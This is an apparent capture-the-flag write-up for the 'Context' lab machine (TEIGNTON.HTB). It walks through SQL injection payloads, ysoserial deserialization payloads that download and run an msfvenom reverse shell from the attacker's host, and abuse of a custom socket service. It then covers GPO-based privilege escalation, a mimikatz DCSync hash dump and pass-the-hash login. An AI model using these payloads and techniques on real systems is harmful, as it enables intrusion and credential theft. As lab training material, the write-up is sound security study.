# Nmap
```
# Nmap 7.95 scan initiated Thu Jul 31 14:38:42 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.13.37.12
Nmap scan report for 10.13.37.12
Host is up (0.29s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
443/tcp  open  ssl/https
| ssl-cert: Subject: commonName=WMSvc-SHA2-WEB
| Not valid before: 2020-10-12T18:31:49
|_Not valid after:  2030-10-10T18:31:49
|_http-title: Home page - Home
|_http-server-header: Microsoft-IIS/10.0
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2070.00; GDR1
| ms-sql-ntlm-info: 
|   10.13.37.12:1433: 
|     Target_Name: TEIGNTON
|     NetBIOS_Domain_Name: TEIGNTON
|     NetBIOS_Computer_Name: WEB
|     DNS_Domain_Name: TEIGNTON.HTB
|     DNS_Computer_Name: WEB.TEIGNTON.HTB
|     DNS_Tree_Name: TEIGNTON.HTB
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.13.37.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 GDR1
|       number: 15.00.2070.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: GDR1
|       Post-SP patches applied: false
|_    TCP port: 1433
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WEB.TEIGNTON.HTB
| Not valid before: 2025-07-02T18:12:18
|_Not valid after:  2026-01-01T18:12:18
| rdp-ntlm-info: 
|   Target_Name: TEIGNTON
|   NetBIOS_Domain_Name: TEIGNTON
|   NetBIOS_Computer_Name: WEB
|   DNS_Domain_Name: TEIGNTON.HTB
|   DNS_Computer_Name: WEB.TEIGNTON.HTB
|   DNS_Tree_Name: TEIGNTON.HTB
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-31T04:50:02+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -9h49m59s, deviation: 0s, median: -9h49m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 31 14:40:42 2025 -- 1 IP address (1 host up) scanned in 120.14 seconds
```

# Page check
**index page**
![](images/Pasted%20image%2020250731145142.png)

**admin page**
![](images/Pasted%20image%2020250731145232.png)
But we don't have any credit here.Let's continue to enumerate other pages.

**Staff page**
![](images/Pasted%20image%2020250731145446.png)
From the source code of this page, we can find the first flag
![](images/Pasted%20image%2020250731145513.png)
And the credit `jay.teignton:admin`

Then we can successfully get access to management page
![](images/Pasted%20image%2020250731145612.png)

# sql-injection in management
Then I would try to find the sql injection here.
![](images/Pasted%20image%2020250731145750.png)When we use the payload of `'+(select db_name())+'`
Then we can find something interesting from here
![](images/Pasted%20image%2020250731145822.png)
We can see the database name is `users`
By listing the `webapp` objects that are specifically of type tablas, we can find an object called users, which typically contains the credentials.
```
'+(select name from webapp..sysobjects where xtype = 'U' order by name offset 1 rows fetch next 1 rows only)+'  
```
Reading the username field from the user table returns the user `abbie.buckfast`
`'+(select top 1 username from users order by username)+'  `
![](images/Pasted%20image%2020250731145949.png)

Continue to do the same for the password field
`'+(select top 1 password from users order by username)+'`
![](images/Pasted%20image%2020250731150121.png)
Then we get another credit here `abbie.buckfast:AMkru$3_f'/Q^7f?`

In addition to finding the credentials, we can also find the flag
`'+(select password from users order by username offset 2 rows fetch next 1 rows only)+'`
![](images/Pasted%20image%2020250731150244.png)

Then I would continue to check the valid web-contents here.
```
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Context]
└─$ wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -u https://10.13.37.12/FUZZ -t 100 --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.13.37.12/FUZZ
Total requests: 26583

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                        
=====================================================================

000000077:   401        0 L      0 W        0 Ch        "api"                                                                                                          
000000003:   200        81 L     196 W      2879 Ch     "admin"                                                                                                        
000000127:   200        78 L     232 W      2548 Ch     "home"                                                                                                         
000001936:   401        0 L      0 W        0 Ch        "rpc"                                                                                                          
000005511:   403        0 L      0 W        0 Ch        "sapi"                                                                                                         
000008262:   302        3 L      8 W        205 Ch      "owa"                                                                                                          
000014446:   401        0 L      0 W        0 Ch        "autodiscover"                                                                                                 
000015097:   302        3 L      8 W        205 Ch      "ecp"                                                                                                          
000020795:   401        0 L      0 W        0 Ch        "ews"                                                                                                          

Total time: 88.67443
Processed Requests: 26478
Filtered Requests: 26469
Requests/sec.: 298.5979

 /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:78: UserWarning:Fatal exception: Pycurl error 3: URL rejected: Malformed input to a URL function

```

From them, `/ecp` is the new one for us.
![](images/Pasted%20image%2020250731150744.png)

Then we can use the credit we get before to get access
![](images/Pasted%20image%2020250731151018.png)
By press the search button
![](images/Pasted%20image%2020250731151100.png)
We can find 2 accounts here.

And also, we can press the account button, and `Open another mailbox` here
![](images/Pasted%20image%2020250731151240.png)
And we can switch to `jay`
![](images/Pasted%20image%2020250731151310.png)
Also we can get another flag from `sent item`
![](images/Pasted%20image%2020250731151416.png)
From the next email, we can download the `WebApplication.zip`
![](images/Pasted%20image%2020250731151455.png)
By viewing the source code, I found something from ` _ViewStart.cshtml`
```
﻿@{
    Layout = "~/Views/Shared/_Layout.cshtml";
}

@using System.Text;
@using System.Web.Script.Serialization;
@{ 
    if (0 != Context.Session.Keys.Count) {
        if (null != Context.Request.Cookies.Get("Profile")) {
            try {
                byte[] data = Convert.FromBase64String(Context.Request.Cookies.Get("Profile")?.Value);
                string str = UTF8Encoding.UTF8.GetString(data);

                SimpleTypeResolver resolver = new SimpleTypeResolver();
                JavaScriptSerializer serializer = new JavaScriptSerializer(resolver);

                object obj = (serializer.Deserialize(str, typeof(object)) as Profile);
                // TODO: create profile to change the language and font of the website 
            } catch (Exception e) {
            }
        }
    }
}
```
It gets the value of the Profile cookie, decodes its `base64` value and `deserializes` it using `JavaScriptSerializer`
This is vulnerable to `deserialization` attacks. We can first create an `exe` file with `msfvenom`, which will send us a `powershell`. After the creation is completed, we share it through the `http` server created with python.
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Context]
└─$ msfvenom -p windows/x64/powershell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f exe -o shell.exe  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 1877 bytes
Final size of exe file: 8192 bytes
Saved as: shell.exe
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Context]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

# JavaScriptSerializer
Then let's use In windows with `ysoserial` installed, we create a payload using `base64`, indicating the `JavaScriptSerializer` format and its corresponding gadget, which will curl our server and download the `shell..exe` file in the` C:\ProgramData `directory
```
PS C:\Users\wither\Downloads\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> ./ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.10.14.5/shell.exe -o C:\ProgramData\shell.exe"
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgY3VybCAxMC4xMC4xNC41L3NoZWxsLmV4ZSAtbyBDOlxcUHJvZ3JhbURhdGFcXHNoZWxsLmV4ZScNCiAgICAgICAgfQ0KICAgIH0NCn0=
```

Then We create a cookie named Profile in the main web and we pass the entire payload serialized and `base64` encoded as the value of this cookie
![](images/Pasted%20image%2020250731152928.png)
Then reload this page, we can see it get back
```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
10.13.37.12 - - "GET /shell.exe HTTP/1.1" 200 -
```

Now we need to create another payload here to run this shell
```
.\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c C:\ProgramData\shell.exe"
ew0KICAgICdfX3R5cGUnOidTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlciwgUHJlc2VudGF0aW9uRnJhbWV3b3JrLCBWZXJzaW9uPTQuMC4wLjAsIEN1bHR1cmU9bmV1dHJhbCwgUHVibGljS2V5VG9rZW49MzFiZjM4NTZhZDM2NGUzNScsIA0KICAgICdNZXRob2ROYW1lJzonU3RhcnQnLA0KICAgICdPYmplY3RJbnN0YW5jZSc6ew0KICAgICAgICAnX190eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknLA0KICAgICAgICAnU3RhcnRJbmZvJzogew0KICAgICAgICAgICAgJ19fdHlwZSc6J1N5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvLCBTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgICAgICdGaWxlTmFtZSc6J2NtZCcsICdBcmd1bWVudHMnOicvYyBjbWQgL2MgQzpcXFByb2dyYW1EYXRhXFxzaGVsbC5leGUnDQogICAgICAgIH0NCiAgICB9DQp9  
```

Also like we do before, then we can get the reverse shell as `teignton\web_user`
```
nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.12
Windows PowerShell running as user web_user on WEB
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32> whoami
teignton\web_user
PS C:\Windows\system32>
```

In `C:\,` we found a Logs directory, within which there was a `WEBDB` directory containing several log files, likely from a web database.
```
PS C:\> dir 

    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/10/2020     23:14                9624b4180591c9eb43d11878de360a
d-r---       12/10/2020     18:59                Clients
d-----       02/06/2022     12:10                ExchangeSetupLogs
d-----       12/10/2020     15:44                inetpub
d-----       12/10/2020     18:45                Logs
d-----       12/10/2020     15:15                PerfLogs
d-r---       14/10/2020     17:19                Program Files
d-----       12/10/2020     19:31                Program Files (x86)
d-----       13/10/2020     00:40                root
d-----       12/10/2020     15:43                SQL2019
d-----       17/04/2023     17:24                tmp
d-r---       12/10/2020     19:31                Users
d-----       14/10/2020     11:55                Windows
-a----       14/04/2023     17:41             29 BitlockerActiveMonitoringLogs


PS C:\> cd Logs

PS C:\Logs> dir

    Directory: C:\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/10/2020     18:45                W3SVC1
d-----       12/10/2020     18:45                WEBDB


PS C:\Logs> cd WEBDB

PS C:\Logs\WEBDB> dir

    Directory: C:\Logs\WEBDB

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       30/04/2020     15:42          16962 ERRORLOG
-a----       30/04/2020     15:41          38740 ERRORLOG.1
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688578520000.xel
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688633370000.xel
-a----       27/04/2020     14:47          70144 HkEngineEventFile_0_132324688733830000.xel
-a----       27/04/2020     14:57          70144 HkEngineEventFile_0_132324694642170000.xel
-a----       27/04/2020     15:09          70144 HkEngineEventFile_0_132324701496760000.xel
-a----       28/04/2020     11:11          70144 HkEngineEventFile_0_132325422936270000.xel
-a----       29/04/2020     15:23          70144 HkEngineEventFile_0_132326437911670000.xel
-a----       29/04/2020     16:04          70144 HkEngineEventFile_0_132326462946300000.xel
-a----       29/04/2020     16:08          70144 HkEngineEventFile_0_132326464955870000.xel
-a----       30/04/2020     09:55          70144 HkEngineEventFile_0_132327105065260000.xel
-a----       30/04/2020     10:15          70144 HkEngineEventFile_0_132327117227960000.xel
-a----       30/04/2020     10:56          70144 HkEngineEventFile_0_132327142045910000.xel
-a----       30/04/2020     12:33          70144 HkEngineEventFile_0_132327199844110000.xel
-a----       30/04/2020     14:45          70144 HkEngineEventFile_0_132327279504690000.xel
-a----       30/04/2020     15:41          70144 HkEngineEventFile_0_132327312839890000.xel  
-a----       30/04/2020     10:55        1048576 log_10.trc
-a----       30/04/2020     11:34        1048576 log_11.trc
-a----       30/04/2020     14:45        1048576 log_12.trc
-a----       30/04/2020     15:41        1048576 log_13.trc
-a----       30/04/2020     15:41           2560 log_14.trc
-a----       30/04/2020     11:34         130048 system_health_0_132327142055920000.xel
-a----       30/04/2020     14:45         160768 system_health_0_132327199872080000.xel
-a----       30/04/2020     15:41         131072 system_health_0_132327279509840000.xel
-a----       30/04/2020     15:41          98816 system_health_0_132327312844270000.xel

PS C:\Logs\WEBDB>
```

In the log we can find credentials that may be valid for db
```
PS C:\Logs\WEBDB> type log_13.trc | Select-String TEIGNTON

????????? ??? ?????? ?????????? ??????? TEIGNTON\karl.memaybe  
????????? ??? ?????? ?????????? ??????? B6rQx_d&RVqvcv2A

PS C:\Logs\WEBDB>
```

# Enumerating the database
We have known this machine has open port `1433`, so let's try to connect it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Context]
└─$ impacket-mssqlclient teignton.htb/karl.memaybe:'B6rQx_d&RVqvcv2A'@10.13.37.12 -windows-auth  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WEB\WEBDB): Line 1: Changed database context to 'master'.
[*] INFO(WEB\WEBDB): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 822) 
[!] Press help for extra shell commands
SQL (TEIGNTON\karl.memaybe  guest@master)> select name from sysdatabases;
name     
------   
master   

tempdb   

model    

msdb     

webapp   

SQL (TEIGNTON\karl.memaybe  guest@master)> 

```

I think `webapp` would be our target here, but we can't check that.
```
SQL (TEIGNTON\karl.memaybe  guest@master)> use webapp;
ERROR(WEB\WEBDB): Line 1: The server principal "TEIGNTON\karl.memaybe" is not able to access the database "webapp" under the current security context.

```

Let's continue to check the valid sersers
```
SQL (TEIGNTON\karl.memaybe  guest@master)> select @@servername;
            
---------   
WEB\WEBDB   

SQL (TEIGNTON\karl.memaybe  guest@master)> select srvname from sysservers; 
srvname       
-----------   
WEB\CLIENTS   

WEB\WEBDB  
```

Using `openquery` we can execute queries from the `CLIENTS` server
```
SQL (TEIGNTON\karl.memaybe  guest@master)> select * from openquery([web\clients], 'select @@servername;');
              
-----------   
WEB\CLIENTS   

SQL (TEIGNTON\karl.memaybe  guest@master)> select * from openquery([web\clients], 'select name from sysdatabases;'); 
name      
-------   
master    

tempdb    

model     

msdb      

clients   
```
We found a new database `clients`, and we can find something interesting from that
```
SQL (TEIGNTON\karl.memaybe  guest@master)> select * from openquery([web\clients], 'select name from clients.sys.objects;');  
name                           
----------------------------   
BackupClients                  

card_details                   

QueryNotificationErrorsQueue   

queue_messages_1977058079      

EventNotificationErrorsQueue   

queue_messages_2009058193      

ServiceBrokerQueue             

queue_messages_2041058307
```

I will continue to check the `card_details` table
```
select * from openquery([web\clients], 'select * from clients.dbo.card_details;'); 
```

But there are so many information from that, I will try another way to check them
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Context]
└─$ sqsh -S 10.13.37.12:1433 -U 'teignton\karl.memaybe' -P 'B6rQx_d&RVqvcv2A'
sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1> select * from openquery([web\clients], 'select * from clients.dbo.card_details;');  
2> go | grep CONTEXT
        CONTEXT{g1mm2_g1mm3_g1mm4_y0ur_cr3d1t}  
```


In addition, in the clients database, we also found some files in assembly_files
Let's use `base64` to export them for us
```
select cast (N'' as xml).value('xs:base64Binary(sql:column("content"))','varchar(max)') as data from openquery([web\clients], 'select * from clients.sys.assembly_files;') order by content desc offset 1 rows;
```

Then let's decode the `base64` content and the remaining file appears to be a `dll`
```
cat data | base64 -d > file

file file
file: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections  
```

Let's use `dnspy` to help us `decompile` that
We found a `BackupClients` function that defines system-level credentials
![](images/Pasted%20image%2020250731162614.png)
`jay.teignton:'D0ntL0seSk3l3tonK3y!'`

Then we can use `evil-winrm` to connect the shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Context]
└─$ evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'             
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jay.teignton\Documents> 

```
In the directory of `C:\Users\jay.teignton\Documents>`, there is a file `WindowsService.exe`.
Let's download it and `decompile` it.
Found a Start function, which seems to be the main function
![](images/Pasted%20image%2020250731163331.png)

This function starts a socket on port 7734 and then checks whether the `CheckClientPassword` function returns true. If so, it passes the operation to the `CheckClientCommand` function.
![](images/Pasted%20image%2020250731163437.png)
![](images/Pasted%20image%2020250731163451.png)
The `CheckClientPassword` function verifies that the password is equal to the result of `TCPServer.Password `and explicitly indicates it with the prefix `password=.`
The expected payload is actually very simple, it consists of the result of the current timezone in the following format `yyyy-MM-dd `plus the string `-thisisleet`
We can use Get-Date to get it
```
*Evil-WinRM* PS C:\Users\jay.teignton\Documents> (Get-Date -Format "yyyy-MM-dd") + "-thisisleet"  
2025-07-31-thisisleet
```

The `CheckClientCommand` function only accepts commands prefixed with `command=.`

To exploit it, we need to upload the `nc.exe` and connect the port 7734 
```
*Evil-WinRM* PS C:\Users\jay.teignton\Documents> ./nc.exe 127.0.0.1 7734 -v
nc.exe : WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
    + CategoryInfo          : NotSpecified: (WEB.TEIGNTON.HT...] 7734 (?) open:String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
```
The current shell could not do that, we have to use `ConPtyShell` to help us

Then we can use the shell script we upload before
```
PS C:\Users\jay.teignton\Documents> .\netcat.exe 127.0.0.1 7734 -v  
WEB.TEIGNTON.HTB [127.0.0.1] 7734 (?) open
password=2023-04-19-thisisleet
OK
command=c:\programdata\shell.exe
CONTEXT{l0l_s0c3ts_4re_fun}
PS C:\Users\jay.teignton\Documents>

nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.13.37.12
Windows PowerShell running as user andy.teignton on WEB
Copyright (C) Microsoft Corporation. All rights reserved.  

PS C:\Windows\system32> whoami
teignton\andy.teignton
PS C:\Windows\system32>
```

# Privilege escalation
We found that we could create a `Group Policy Object`, so we created a new object called `privesc`
```
PS C:\ProgramData> New-GPO -Name privesc -Comment "Privilege Escalation"  

DisplayName      : privesc
DomainName       : TEIGNTON.HTB
Owner            : TEIGNTON\andy.teignton
Id               : d85448d7-e996-4863-816c-ef9930ba5206 
GpoStatus        : AllSettingsEnabled
Description      : Privilege Escalation
CreationTime     : 19/04/2023 00:10:22
ModificationTime : 19/04/2023 00:10:22
UserVersion      : AD Version: 0, SysVol Version: 0     
ComputerVersion  : AD Version: 0, SysVol Version: 0     
WmiFilter        :

PS C:\ProgramData>
```

Link the `privesc` GPO to the Domain Controllers `OU` in `teignton.htb`
```
PS C:\ProgramData> New-GPLink -Name privesc -Target "OU=Domain Controllers,DC=TEIGNTON,DC=HTB" -LinkEnabled Yes  

GpoId       : d85448d7-e996-4863-816c-ef9930ba5206     
DisplayName : privesc
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=TEIGNTON,DC=HTB 
Order       : 2
```

Using `SharpGPOAbuse`, add the local `Administrator` level using the vulnerable GPO you just created
```
PS C:\ProgramData> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount jay.teignton --gponame privesc
[+] Domain = teignton.htb
[+] Domain Controller = WEB.TEIGNTON.HTB
[+] Distinguished Name = CN=Policies,CN=System,DC=TEIGNTON,DC=HTB
[+] SID Value of jay.teignton = S-1-5-21-3174020193-2022906219-3623556448-1103
[+] GUID of "privesc" is: {D85448D7-E996-4863-816C-EF9930BA5206}
[+] Creating file \\teignton.htb\SysVol\teignton.htb\Policies\{D85448D7-E996-4863-816C-EF9930BA5206}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf  
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
PS C:\ProgramData>
```

Apply changes and reset Group Policy settings
```
PS C:\ProgramData> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.  
User Policy update has completed successfully.
```

Log in again as `jay.teignton `and we are now in the administrator group
```
evil-winrm -i 10.13.37.12 -u jay.teignton -p 'D0ntL0seSk3l3tonK3y!'
PS C:\Users\jay.teignton\Documents> whoami
teignton\jay.teignton
PS C:\Users\jay.teignton\Documents> Get-ADPrincipalGroupMembership -Identity "jay.teignton" | Select Name  

Name
----
Domain Users
Administrators
Remote Desktop Users
Remote Management Users

PS C:\Users\jay.teignton\Documents>
```
Then we can access to `Adminisrator` directory and check the flag
```
PS C:\Users\jay.teignton\Documents> cd C:\Users\Administrator\Documents
PS C:\Users\Administrator\Documents> dir

    Directory: C:\Users\Administrator\Documents

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       10/12/2020   5:53 PM                SQL Server Management Studio  
d-----       10/12/2020   6:53 PM                Visual Studio 2017
-a----        7/15/2020   8:15 PM             34 flag.txt
-a----        7/29/2020  12:28 PM            188 info.txt

PS C:\Users\Administrator\Documents> type flag.txt
CONTEXT{OU_4bl3_t0_k33p_4_s3cret?}
PS C:\Users\Administrator\Documents>
```

We can also use `mimikatz` to dump the hashes NTLMs
```
PS C:\Users\jay.teignton\Documents> .\mimikatz.exe "lsadump::dcsync /user:Administrator" exit

  .#####.   mimikatz 2.2.0 (x64) #18362 Feb 29 2020 11:13:36
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::dcsync /domain:teignton.htb /user:Administrator
[DC] 'teignton.htb' will be the domain
[DC] 'WEB.TEIGNTON.HTB' will be the DC server
[DC] 'Administrator' will be the user account

Object RDN           : Administrator

** SAM ACCOUNT **

SAM Username         : Administrator
User Principal Name  : Administrator@TEIGNTON.HTB
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00010200 ( NORMAL_ACCOUNT DONT_EXPIRE_PASSWD )
Account expiration   :
Password last change : 12/10/2020 14:34:20
Object Security ID   : S-1-5-21-3174020193-2022906219-3623556448-500
Object Relative ID   : 500

Credentials:
  Hash NTLM: 5059c4cf183da02e2f41bb1f53d713cc

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : f0a3bbc4c8a22573685ec11d8b5a76c9

* Primary:Kerberos-Newer-Keys *
    Default Salt : WIN-K0IK59G7ILOAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 90f5c97ddad9eaf5aa247836e00b7a4c89935258c2a01ce051594cf3cb03798d  
      aes128_hmac       (4096) : 466d899b2f855f4f705cb990a427168a
      des_cbc_md5       (4096) : c451bf16c416dce0

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WIN-K0IK59G7ILOAdministrator
    Credentials
      des_cbc_md5       : c451bf16c416dce0


mimikatz(commandline) # exit
Bye!
PS C:\Users\jay.teignton\Documents>
```

Then we can use `evil-winrm` to connect it
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Context]
└─$ evil-winrm -i 10.13.37.12 -u Administrator -H 5059c4cf183da02e2f41bb1f53d713cc 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

# Description
Another CTF machine, kind of difficult and confused about decompile the `.net` files and `.ddl` files.
